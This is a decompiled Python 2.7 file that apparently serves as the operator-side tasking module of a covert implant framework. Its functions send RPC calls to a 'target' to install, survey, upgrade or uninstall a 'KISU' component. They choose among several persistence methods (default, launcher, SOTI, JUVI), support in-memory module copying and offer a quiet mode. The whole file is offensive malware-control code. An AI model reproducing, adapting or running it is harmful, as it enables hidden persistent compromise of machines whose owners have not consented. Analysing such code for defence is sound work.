# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DiBa_Tasking.py
_CMD_INDEX_INSTALL = 0
_CMD_INDEX_UNINSTALL = 1
_CMD_INDEX_SURVEY = 2
_CMD_INDEX_UPGRADE = 3

def TaskingMain(namespace):
    import sys
    import re
    for arg in sys.argv:
        matchObj = re.match('procedure=(.*)', arg)
        if matchObj != None:
            procedure = int(matchObj.group(1))

    if procedure == _CMD_INDEX_INSTALL:
        return _handleInstall(namespace)
    else:
        if procedure == _CMD_INDEX_UNINSTALL:
            return _handleUninstall(namespace)
        if procedure == _CMD_INDEX_SURVEY:
            return _handleSurvey(namespace)
        if procedure == _CMD_INDEX_UPGRADE:
            return _handleUpgrade(namespace)
        import mcl.tasking
        mcl.tasking.EchoError('Unknown procedure (%u)' % procedure)
        return False
        return


def _handleInstall(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    _CMD_PERSIST_TYPE_DEFAULT = 0
    _CMD_PERSIST_TYPE_LAUNCHER = 1
    _CMD_PERSIST_TYPE_SOTI = 2
    _CMD_PERSIST_TYPE_JUVI = 3
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mcf.cmd.diba.ParamsInstall()
    if lpParams['persist'] == _CMD_PERSIST_TYPE_DEFAULT:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_DEFAULT
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_LAUNCHER:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_LAUNCHER
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_SOTI:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_SOTI
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_JUVI:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_JUVI
    else:
        mcl.tasking.OutputError('Persistance method not recognized / implemented')
        return False
    if lpParams['type'] != None:
        mcl.imports.ImportWithNamespace(namespace, 'mcf.kisu.ids', globals())
        if mcf.kisu.ids.nameTable.has_key(lpParams['type'].upper()):
            tgtParams.instance = mcf.kisu.ids.nameTable[lpParams['type'].upper()]
        else:
            mcl.tasking.EchoError('Unknown KISU type (%s)' % lpParams['type'])
            return False
    else:
        tgtParams.instance = lpParams['instance']
    rpc = mcf.cmd.diba.tasking.RPC_INFO_INSTALL
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    if not lpParams['quiet']:
        mcl.tasking.Echo('Installing 0x%08x' % tgtParams.instance)
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mcf.cmd.diba.errorStrings)
        return False
    else:
        return True


def _handleSurvey(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    rpc = mcf.cmd.diba.tasking.RPC_INFO_SURVEY
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mcf.cmd.diba.errorStrings)
        return False
    return True


def _handleUninstall(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mcf.cmd.diba.ParamsUninstall()
    if lpParams['type'] != None:
        mcl.imports.ImportWithNamespace(namespace, 'mcf.kisu.ids', globals())
        if mcf.kisu.ids.nameTable.has_key(lpParams['type'].upper()):
            tgtParams.instance = mcf.kisu.ids.nameTable[lpParams['type'].upper()]
        else:
            mcl.tasking.EchoError('Unknown KISU type (%s)' % lpParams['type'])
            return False
    else:
        tgtParams.instance = lpParams['instance']
    rpc = mcf.cmd.diba.tasking.RPC_INFO_UNINSTALL
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mcf.cmd.diba.errorStrings)
        return False
    else:
        return True


def _handleUpgrade(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    _CMD_PERSIST_TYPE_DEFAULT = 0
    _CMD_PERSIST_TYPE_LAUNCHER = 1
    _CMD_PERSIST_TYPE_SOTI = 2
    _CMD_PERSIST_TYPE_JUVI = 3
    _CMD_MODULECOPY_TYPE_MEMORY = 0
    _CMD_MODULECOPY_TYPE_NONE = 1
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mcf.cmd.diba.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mcf.cmd.diba.ParamsUpgrade()
    if lpParams['persist'] == _CMD_PERSIST_TYPE_DEFAULT:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_DEFAULT
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_LAUNCHER:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_LAUNCHER
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_SOTI:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_SOTI
    elif lpParams['persist'] == _CMD_PERSIST_TYPE_JUVI:
        tgtParams.persistence = mcf.cmd.diba.PARAMS_PERSISTENCE_TYPE_JUVI
    else:
        mcl.tasking.OutputError('Persistance method not recognized')
        return False
    if lpParams['type'] != None:
        mcl.imports.ImportWithNamespace(namespace, 'mcf.kisu.ids', globals())
        if mcf.kisu.ids.nameTable.has_key(lpParams['type'].upper()):
            tgtParams.instance = mcf.kisu.ids.nameTable[lpParams['type'].upper()]
        else:
            mcl.tasking.EchoError('Unknown KISU type (%s)' % lpParams['type'])
            return False
    else:
        tgtParams.instance = lpParams['instance']
    if lpParams['modulecopy'] == _CMD_MODULECOPY_TYPE_MEMORY:
        tgtParams.moduleAction = mcf.cmd.diba.PARAMS_UPGRADE_MODULEACTION_COPY_MEMORY
    elif lpParams['modulecopy'] == _CMD_MODULECOPY_TYPE_NONE:
        tgtParams.moduleAction = mcf.cmd.diba.PARAMS_UPGRADE_MODULEACTION_COPY_NONE
    else:
        mcl.tasking.OutputError('Module action method not recognized')
        return False
    rpc = mcf.cmd.diba.tasking.RPC_INFO_UPGRADE
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    if not lpParams['quiet']:
        mcl.tasking.Echo('Upgrading 0x%08x' % tgtParams.instance)
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mcf.cmd.diba.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)